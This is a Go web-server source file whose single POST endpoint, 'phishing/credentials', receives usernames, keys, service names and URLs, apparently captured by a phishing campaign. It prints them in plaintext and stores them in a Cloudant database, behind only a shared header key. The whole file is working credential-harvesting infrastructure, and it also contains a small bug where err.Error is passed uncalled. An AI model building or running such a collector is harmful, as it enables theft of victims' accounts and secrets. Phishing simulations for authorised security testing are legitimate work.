package main

import (
	"fmt"
	"github.com/labstack/echo"
	"github.com/IBM/cloudant-go-sdk/cloudantv1"
	"github.com/google/uuid"
	"encoding/json"
	"net/http"
	"os"
)

var (
	CLOUDANT_DB=os.Getenv("CLOUDANT_DB")
	SERVER_PORT=os.Getenv("SERVER_PORT")
	SERVER_ACCESS_KEY=os.Getenv("ACCESS_KEY")
)

type Credentials struct {
	ID		string  `json:"id"`
	Username 	string	`json:"username"`
	Key		string	`json:"key"`
	Service		string	`json:"service"`
	Url		string	`json:"url"`
}

func StoreCredential(credential Credentials) error {
	credential.ID = fmt.Sprintf("credentials:%s", uuid.New().String())
	client, err := cloudantv1.NewCloudantV1UsingExternalConfig(
		&cloudantv1.CloudantV1Options{},
	)
	if err != nil {
		return err
	}
	doc := cloudantv1.Document{
		ID: &credential.ID,
	}
	doc.SetProperty("username", credential.Username)
	doc.SetProperty("key", credential.Key)
	doc.SetProperty("service", credential.Service)
	doc.SetProperty("url", credential.Url)
	options := client.NewPostDocumentOptions(
		CLOUDANT_DB,
	).SetDocument(&doc)
	_, _, err = client.PostDocument(options)
	fmt.Printf("> Post Response Error: %v\n", err)
	return err
}

func HandleCredentials(c echo.Context) error {
	credential := Credentials{}
	if (c.Request().Header.Get("AccessKey") != SERVER_ACCESS_KEY){
		fmt.Printf("> Unauthorized\n")
		return c.String(http.StatusUnauthorized, "{\"status\":\"unauthorized\"}")
	}
	defer c.Request().Body.Close()
	err := json.NewDecoder(c.Request().Body).Decode(&credential)
	if err != nil {
		fmt.Printf("> Error reading credential:\n%v\n", err)
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error)
	}
	fmt.Printf("> Saving credential: \n%v\n", credential)
	err = StoreCredential(credential)
	if err != nil {
		fmt.Printf("> Error storing credential:\n%v\n", err)
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error)
	}
	return c.String(http.StatusOK, "{\"status\":\"ok\"}")
}


func main() {
	e := echo.New()
	e.POST("phishing/credentials", HandleCredentials)

	e.Logger.Fatal(e.Start(":" + SERVER_PORT))
}
